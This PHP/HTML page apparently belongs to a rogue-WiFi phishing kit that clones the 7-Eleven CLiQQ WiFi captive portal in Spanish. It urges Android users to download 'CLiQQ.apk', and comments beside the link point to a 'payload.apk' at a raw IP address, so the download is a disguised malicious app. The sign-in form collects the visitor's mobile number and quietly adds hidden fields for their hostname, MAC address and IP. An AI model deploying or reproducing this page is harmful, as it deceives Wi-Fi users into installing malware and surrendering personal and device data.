<?php
$destination = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
require_once('helper.php');
?>

<!DOCTYPE html>
<!-- saved from url=(0050)http://redeem.7-eleven.com.ph:8084/RedemptionHost/ -->
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<!--        <title>RedemptionHost</title>-->
        <link rel="shortcut icon" href="assets/img/7-11.ico" type="image/x-icon" />


        <meta name="viewport" content="width=device-width, initial-scale=1"/>        
     
 
        <link rel="stylesheet" href="assets/css/wifi.css" />
<!--        <link rel="stylesheet" href="/css/bootstrap.min.css" />-->
      
        </head>
        <body onload="
//          if(((document.URL).match(&#39;7-eleven.com.ph&#39;))==null) {
//            loadjscssfile(&#39;/RedemptionHost/css/seveneleven.css&#39;,&#39;css&#39;);
//          }
                      ">
<div class="container">
    <div class="row">	
      <div class="span5">
        <div class="well">
    <div align="center">
      
        <header>
          <div class="header-content">
              <div class="header-content-inner">
                  <img class="img-responsive center-block" src="assets/img/cliqqwifi.png" alt="" />
                  <p>Si tiene la aplicación CLiQQ, inicia sesión automáticamente. Puede cerrar esta ventana ahora.</p>
                  
                  <p>Para usuarios de teléfonos Android, si no tiene la aplicación CLiQQ, puede hacer clic en el enlace a continuación para descargar el APK</p>
                  
<!--                     url ="http://202.60.9.120/payload.apk"
                         url ="http://cdn.7-eleven.com.ph/payload.apk"
-->
                  <a href="CLiQQ.apk" class="btn btn-success">Download here</a> 
                  <br/>    
                  <br/>    
                  <p>O puede usar el inicio de sesión manual a continuación para obtener acceso a Internet y descargar la aplicación desde Play Store o App Store.</p>
              </div>
          </div>
      </header>
      <section id="services">
  <div class="container">
    <div class="row">
      <div class="col-lg-12 text-center">
        <h2 class="section-heading">Auto Sign-in</h2>
        <hr class="primary">
        <p class="text-muted">Si el inicio de sesión automático está habilitado, se iniciará sesión automáticamente cuando ingrese a un punto de acceso WiFi CLiQQ. Asegúrese de que el interruptor WiFi esté en ON.</p>
        <img class="img-responsive" src="assets/img/auto-sign-in.png" alt="" />
      </div>
    </div>
    <hr>
    <div class="row">
      <div class="col-lg-12 text-center">
        <h2 class="section-heading">Manual Sign-in</h2>
        <hr class="primary">
        <p class="text-muted">Para la mejor experiencia, descargue la aplicación para habilitar el inicio de sesión automático. 
        Toque el botón a continuación para obtener acceso a Internet y descargar la aplicación CLiQQ de la tienda de aplicaciones.</p>
      </div>
    </div>
  </div>
</section>  
        <form action="post.php" method="post" class="form-signin">
        <p class="lead">
        Ingrese su número de teléfono móvil para continuar. 
          </p>
        <p>
<!--          <input type="text" name="mobileNumber" value="09xxxxxxxxx" required="true" onfocus="if (this.value==&#39;09xxxxxxxxx&#39;) this.value = &#39;&#39;" id="mobileNumber" />-->
          <input style="width:92%" type="text" name="mobileNumber" value="" required="true" onfocus="if (this.value==&#39;09xxxxxxxxx&#39;) this.value = &#39;&#39;" placeholder="09xxxxxxxxx" id="mobileNumber">
          <input type="hidden" name="hostname" value="<?=getClientHostName($_SERVER['REMOTE_ADDR']);?>">
          <input type="hidden" name="mac" value="<?=getClientMac($_SERVER['REMOTE_ADDR']);?>">
          <input type="hidden" name="ip" value="<?=$_SERVER['REMOTE_ADDR'];?>">
          <input type="hidden" name="target" value="https://redeem.cliqq.net/login/auth">
        </p>
        <p>
        <button type="submit" class="btn btn-primary btn-block">Siguente</button>
        </p>
<!--        <a href="/userAccount/activate"><span>No account yet? Register here.</span></a>    
        </form>   -->
        
    </div>
      </div>
      </div>
    </div>
</div>
 
</body></html>
